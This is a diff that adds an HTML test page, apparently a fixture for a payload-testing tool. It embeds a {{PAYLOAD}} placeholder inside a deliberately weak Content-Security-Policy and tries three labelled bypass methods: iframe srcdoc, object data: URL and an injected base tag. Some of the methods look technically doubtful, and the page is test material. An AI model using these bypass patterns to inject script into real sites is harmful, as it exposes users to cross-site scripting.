@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSP Bypass - DPE Test</title>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; object-src 'none';">
+</head>
+<body>
+    <h2>CSP Bypass Techniques Test</h2>
+    <div id="output"></div>
+    
+    <script>
+        var payload = "{{PAYLOAD}}";
+        
+        // Method 1: CSP bypass via iframe srcdoc
+        var iframe = document.createElement('iframe');
+        iframe.srcdoc = '<script>' + payload + '</script>';
+        document.body.appendChild(iframe);
+        
+        // Method 2: CSP bypass via object data
+        var object = document.createElement('object');
+        object.data = 'data:text/html,' + encodeURIComponent('<script>' + payload + '</script>');
+        document.body.appendChild(object);
+        
+        // Method 3: CSP bypass via base tag
+        var base = document.createElement('base');
+        base.href = 'data:text/html,';
+        document.head.insertBefore(base, document.head.firstChild);
+    </script>
+</body>
+</html>
